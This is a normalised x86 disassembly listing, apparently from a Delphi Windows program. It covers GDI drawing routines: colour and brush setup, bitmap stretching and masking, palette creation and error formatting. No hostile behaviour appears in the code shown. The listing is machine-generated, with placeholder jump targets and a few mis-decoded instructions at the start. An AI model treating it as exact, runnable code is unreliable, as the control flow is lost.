call sub_40fe88
mov al [ ebp - 0x6 ]
mov edx [ ebp - 0x4 ]
or al [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] al
mov eax [ ebp - 0x4 ]
call sub_40fecc
sub_40fdfd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_40fe24
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_40fe48
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_40ea2c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_40e410
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetTextColor
pop ecx
pop ebp
retn
sub_40fe88
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_40f014
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetROP2
pop ecx
pop ebp
retn
sub_40fecc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_40f3c0
push eax
call UnrealizeObject
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_40f3c0
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_40f4b4
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_40f36c
call sub_40e410
not eax
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBkMode
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_40f36c
call sub_40e410
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBkMode
pop ecx
pop ebp
retn
sub_40ff6c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x8 ] 0x2
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
and [ eax + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
sub_40ffa0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x8 ] 0x4
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
and [ eax + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
sub_40ffd4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x8 ] 0x8
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
and [ eax + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
sub_41006c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4100b6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4100bd
lea eax [ ebp - 0x4 ]
call sub_44cae0
retn
sub_4100c0
push ebp
mov ebp esp
add esp 0xfffffef8
xor eax eax
mov [ ebp - 0x108 ] eax
xor eax eax
push ebp
push sub_410161
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41006c
push 0x0
push 0x100
lea eax [ ebp - 0x104 ]
push eax
push 0x400
mov eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x108 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_44cd10
mov ecx [ ebp - 0x108 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410168
lea eax [ ebp - 0x108 ]
call sub_44cae0
retn
sub_41016c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
call sub_4100c0
sub_410190
push ebp
mov ebp esp
add esp 0xffffffc0
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_4102ec
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x40 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp [ ebp - 0xd ] 0x0
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x14 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_41024f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
call sub_4100c0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_4100c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4102f3
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
mov [ ebp - 0x28 ] eax
push 0xcc0020
mov eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x3c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
call StretchBlt
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
sub_4102fc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x2 ] ax
mov ax [ ebp - 0x2 ]
dec ax
je r-xdata
mov cx [ ebp - 0x2 ]
mov eax 0x1
shl eax cl
mov [ ebp - 0x8 ] eax
jmp r-xdata
sub ax 0x3
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub ax 0x4
jne r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
sub_410338
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
dec [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
not edx
and eax edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
test eax eax
jns r-xdata
sar eax 0x3
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
add eax 0x7
sub_410374
push ebp
mov ebp esp
add esp 0xffffffd8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x28 ] eax
push 0x0
call CreateCompatibleDC
call sub_41016c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_410631
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41016c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x28 ] eax
push 0x0
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov eax [ ebp + 0x18 ]
cmp eax [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectPalette
mov [ ebp - 0x28 ] eax
push 0xffffffff
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectPalette
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x18 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410638
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
mov eax [ ebp - 0x14 ]
push eax
call RealizePalette
push 0xcc0020
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
push eax
call StretchBlt
push r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
push eax
call StretchBlt
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call SetTextColor
mov [ ebp - 0x20 ] eax
push 0xffffff
mov eax [ ebp - 0x4 ]
push eax
call SetBkColor
mov [ ebp - 0x24 ] eax
push 0x8800c6
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call StretchBlt
push 0x660046
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call StretchBlt
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SetTextColor
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SetBkColor
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41016c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_410448
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_444510
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410638
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x14 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectPalette
sub_410644
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0xff
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
lea eax [ eax + edx * 4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
lea eax [ eax + eax * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov al [ eax + 0x2 ]
mov edx [ ebp - 0x14 ]
mov [ edx + 0x2 ] al
mov eax [ ebp - 0x18 ]
mov al [ eax + 0x1 ]
mov edx [ ebp - 0x14 ]
mov [ edx + 0x1 ] al
mov eax [ ebp - 0x18 ]
mov al [ eax ]
mov edx [ ebp - 0x14 ]
mov [ edx ] al
mov eax [ ebp - 0x14 ]
mov [ eax + 0x3 ] 0x0
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax + 0x3 ] 0x0
mov esp ebp
pop ebp
retn
sub_4106b8
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
dec eax
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x100
jge r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x1
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax ]
xor ecx ecx
call sub_44bd90
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x100
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
lea eax [ eax + edx * 4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
lea eax [ eax + eax * 2 ]
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
mov al [ eax + 0x2 ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x2 ] al
mov eax [ ebp - 0x1c ]
mov al [ eax + 0x1 ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x1 ] al
mov eax [ ebp - 0x1c ]
mov al [ eax ]
mov edx [ ebp - 0x20 ]
mov [ edx ] al
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
sub_410764
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_4107bc
push ebp
mov ebp esp
add esp 0xfffffbe8
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x418 ] 0x300
mov [ ebp - 0x416 ] 0x10
lea edx [ ebp - 0x414 ]
mov eax [ ebp - 0x4 ]
mov ecx 0x40
call sub_44bbe8
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4108ca
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4108d1
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x414 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3f8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x416 ]
lea eax [ ebp + eax * 4 - 0x434 ]
push eax
push 0x8
mov eax [ ebp - 0x10 ]
sub eax 0x8
push eax
mov eax [ ebp - 0xc ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3f8 ]
push eax
push 0x1
mov eax [ ebp - 0x10 ]
sub eax 0x8
push eax
mov eax [ ebp - 0xc ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x416 ]
lea eax [ ebp + eax * 4 - 0x430 ]
push eax
push 0x7
mov eax [ ebp - 0x10 ]
sub eax 0x7
push eax
mov eax [ ebp - 0xc ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3f4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0xc ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_4108e8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41097f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x2 ]
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x5 ] 0x1
sub_410990
push ebp
mov ebp esp
add esp 0xfffffbe4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x41c ] 0x300
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x41a ] ax
mov ecx [ ebp - 0xc ]
shl ecx 0x2
lea edx [ ebp - 0x418 ]
mov eax [ ebp - 0x8 ]
call sub_44bbe8
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x418 ]
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x14 ]
push eax
call GetDIBColorTable
mov [ ebp - 0x41a ] ax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
mov eax [ ebp - 0x14 ]
push eax
call DeleteDC
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x41a ] 0x10
jne r-xdata
cmp [ ebp - 0x41a ] 0x0
je r-xdata
movzx edx [ ebp - 0x41a ]
lea eax [ ebp - 0x418 ]
call sub_410764
lea eax [ ebp - 0x41c ]
call sub_4108e8
test al al
jne r-xdata
lea eax [ ebp - 0x41c ]
push eax
call CreatePalette
mov [ ebp - 0x10 ] eax
sub_410a70
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
inc eax
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetPaletteEntries
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_410764
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0x10 ] eax
sub_410ad8
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_410338
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_4102fc
mov [ ebp - 0x14 ] eax
push 0x0
call GetDC
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
xor eax eax
push ebp
push sub_410c8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
add eax 0x28
mov edx [ ebp - 0x14 ]
shl edx 0x2
add eax edx
mov [ ebp - 0x1c ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBitmap
call sub_41016c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_410bab
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_410190
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410bb2
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
retn
call sub_41006c
sub_410bb2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xe ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_410338
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x20 ]
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBitmap
call sub_41016c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_410c6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x10 ]
call sub_410190
mov edx [ ebp - 0xc ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410c74
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
retn
sub_410c9c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_410cc4
push ebp
mov ebp esp
add esp 0xffffffe4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x18 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
